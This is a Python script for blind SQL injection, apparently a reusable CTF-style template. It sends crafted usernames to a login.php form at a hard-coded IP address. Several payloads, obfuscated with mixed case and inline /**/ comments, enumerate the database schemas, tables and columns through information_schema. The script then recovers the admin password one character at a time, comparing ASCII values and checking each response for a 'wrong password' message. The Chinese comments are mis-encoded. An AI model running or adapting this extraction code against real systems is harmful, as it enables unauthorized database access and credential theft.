#!/usr/bin/env python

#coding=utf-8

import requests

def login(_username,_password):
    #éè¦æ¹å¨å¤
    url = "http://58.154.33.13:8001/login.php"
    data = {
        "username":_username,
        "password":_password
    }
    response = requests.post(url,data=data)
    content = response.content
    #print content
    #è¿éæ¯å¤æ­ç²æ³¨çåä¸ªå­ç¬¦æ¯å¦æ­£ç¡®çæ¡ä»¶ï¼ä¸è¬è¿ä¸ªèæ¬æ¨¡æ¿å¨ä½¿ç¨ä¹åè¦ä¿®æ¹æ­¤å¤
    #æ­¤é¢æ¯å ä¸ºæ³¨å¥usernameå­æ®µï¼å½payloadåé¢çè¯­å¥æ­£ç¡®çæ¶åï¼è¿åçæ¯å¯ç éè¯¯ï¼å¦æéè¯¯è¿åç¨æ·åéè¯¯
    #payload=_username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)
    if "å¯ç éè¯¯" in content:
        return True
    else:
        return False

def main():
    find_name = ""
    # i è¡¨ç¤ºäºæè¦æ¥æ¾çåå­çæå¤§é¿åº¦
    for i in range(0x50):
        # 0x80=128 , 0x20=32,  32-128ä¸ºå¯æ¾ç¤ºçå­ç¬¦çåºé´
        for j in range(0x80 , 0x20 , -1):
            #mysql å®æ¹æ³¨é  "-- " --åé¢æç©ºæ ¼,æèç¨ "#"
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/gROup_conCAt(sCHEma_name)/**/From/**/inFormation_SChema.scHemata),%d,1)))=%d))#" %(i,j)    #æ­¤å¤æ¯payload,éè¦æ¹å¨
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/sCHEma_name/**/From/**/inFormation_SChema.scHemata/**/Limit/**/3,1),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(Table_name)/**/From/**/inFormation_SChema.tAbles/**/where/**/taBle_schema='sql1'),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(columN_name)/**/From/**/inFormation_SChema.columns/**/where/**/taBle_naMe='admin'),%d,1)))=%d))#" %(i,j)
            _username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (ASCII(sUBsTring((user()),%d,1)=%d )) --" %(i,j)
            #_username = "amin'or(((asCIi(sUBString((sELEct/**/group_concat(scheMA_Name)/**/FRom/**/inforMATion_scheMa.schemaTa),%d,1)))=%d))-- " % (i, j)
            #å¯æ¹å¨å¤
            _password="amin"
            print _username
            if login(_username,_password):
                find_name+=chr(j)
                print find_name
                break

main()